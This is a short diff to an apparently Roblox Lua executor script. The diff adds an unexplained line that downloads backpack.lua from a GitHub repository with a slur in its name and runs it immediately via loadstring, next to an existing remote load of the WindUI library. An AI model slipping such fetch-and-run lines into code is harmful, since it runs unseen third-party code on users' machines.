@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/2e2retard/retard/refs/heads/main/backpack.lua"))()
+
 local wind_ui = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
 local players, rs = game:GetService("Players"), game:GetService("ReplicatedStorage")
 local lp = players.LocalPlayer
